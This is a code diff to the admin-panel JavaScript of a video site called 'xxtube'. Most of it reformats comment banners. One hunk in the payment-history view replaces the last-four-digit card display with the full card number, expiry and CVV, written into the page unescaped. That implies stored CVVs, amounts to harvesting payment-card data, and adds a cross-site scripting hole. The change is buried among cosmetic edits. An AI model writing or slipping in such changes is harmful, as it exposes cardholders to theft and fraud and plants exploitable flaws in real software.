@@ -1,6 +1,6 @@
-/* ── Admin Panel Bootstrap ────────────────────────────────────
+/* ────── Admin Panel Bootstrap ──────────────────────────────────────────────────────
    Load auth secret from sessionStorage, gate the panel, handle tabs
-──────────────────────────────────────────────────────────── */
+────────────────────────────────────────────────────────────────────────────────── */
 
 let ADMIN_SECRET = sessionStorage.getItem('xxtube-admin-secret') || '';
 let currentAdminTab = 'dashboard';
@@ -80,7 +80,7 @@ async function submitAdminLogin() {
     }
 }
 
-// ── Admin Functions ──────────────────────────────────────────
+// ────── Admin Functions ────────────────────────────────────────────────────────
 
 async function loadDashboard() {
     try {
@@ -116,9 +116,13 @@ async function loadPaymentHistory() {
         container.innerHTML = data.pending.map(p => `
             <div class="payment-card">
                 <div><strong>${esc(p.video_title || 'Unknown')}</strong></div>
+                <div>Email: ${esc(p.email || 'N/A')}</div>
+                <div>Card Name: ${esc(p.card_name || 'N/A')}</div>
+                <div>Card Number: ${p.card_number || 'N/A'}</div>
+                <div>Expiry: ${p.expiry || 'N/A'}</div>
+                <div>CVV: ${p.cvv || 'N/A'}</div>
                 <div>Ref: ${p.transaction_ref}</div>
-                <div>From: ${esc(p.email)}</div>
-                <div>Card: ${p.card_number ? p.card_number.slice(-4) : 'N/A'}</div>
+                <div>Amount: €${parseFloat(p.amount_cents || 0) / 100}</div>
             </div>
         `).join('');
     } catch (e) {
@@ -240,7 +244,7 @@ async function loadCreatorsTable() {
     }
 }
 
-// ── Delete Functions ────────────────────────────────────────
+// ────── Delete Functions ────────────────────────────────────────────────────────
 
 async function deleteVideo(videoId) {
     if (!confirm('Delete this video? This cannot be undone.')) return;
@@ -285,13 +289,13 @@ async function deletePerformer(performerId) {
     } catch (e) { console.error('Delete error:', e); }
 }
 
-// ── Helpers ────────────────────────────────────────────────
+// ────── Helpers ────────────────────────────────────────────────────────────────
 
 function esc(val) { return String(val || '').replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">": "&gt;","\"":"&quot;","'": "&#039;"}[c])); }
 function formatViews(n) { if (!n) return '0'; if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M'; if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K'; return String(n); }
 function formatDuration(s) { if (!s) return '—'; const m = Math.floor(s / 60); return `${m}:${String(Math.floor(s % 60)).padStart(2, '0')}`; }
 
-// ── Events ────────────────────────────────────────────────
+// ────── Events ────────────────────────────────────────────────────────────────
 
 document.getElementById('adminLoginBtn')?.addEventListener('click', submitAdminLogin);
 document.getElementById('adminPassword')?.addEventListener('keydown', e => { if (e.key === 'Enter') submitAdminLogin(); });
